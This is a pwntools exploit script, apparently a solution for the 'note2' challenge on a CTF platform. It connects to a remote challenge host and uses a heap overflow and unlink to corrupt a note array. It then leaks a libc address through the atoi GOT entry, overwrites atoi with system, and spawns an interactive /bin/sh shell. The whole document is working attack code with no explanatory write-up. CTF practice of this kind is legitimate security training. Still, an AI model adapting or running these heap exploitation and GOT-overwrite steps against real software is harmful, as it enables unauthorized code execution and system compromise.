from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./note2"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28578)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

def add(size, con):
    sla("option--->>\n", "1")
    sla("(less than 128)\n", str(size))
    sla("Input the note content:\n", con)

def show(index):
    sla("option--->>\n", "2")
    sla("Input the id of the note:\n", str(index))

def edit(index, ch, con):
    sla("option--->>\n", "3")
    sla("Input the id of the note:\n", str(index))
    sla("[1.overwrite/2.append]\n", str(ch))
    sla("TheNewContents:", con)

def free(index):
    sla("option--->>\n", "4")
    sla("Input the id of the note:\n", str(index))
    

name = ""
sla("Input your name:\n", name)
addr = ""
sla("Input your address:\n", addr)


# chunk overflow

# unlink
heap_arr = 0x0602120 
fd = heap_arr-0x18
bk = heap_arr-0x10 

pad = p64(0)+p64(0x51)+p64(fd)+p64(bk)
add(0x30, pad)  # 0
add(0x0, "")  # 1
add(0x80, "")  # 2

## edit chunk size
pad = cyclic(0x18)+p8(0x90)
edit(1, 1, pad)

## edit pre size
for i in range(7):
    pad = cyclic(0x10+7-i)
    edit(1, 1, pad)
pad = cyclic(0x10)+p8(0x50)
edit(1, 1, pad)

free(2)

# leak libc
pro = ELF("./note2")
atoi_g = pro.got["atoi"]

pad = cyclic(0x18)+p64(atoi_g)
edit(0, 1, pad)
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
system = info-libc.sym["atoi"]+libc.sym["system"]

# attack
edit(0, 1, p64(system))
sla("option--->>\n", "/bin/sh\x00")

shell()


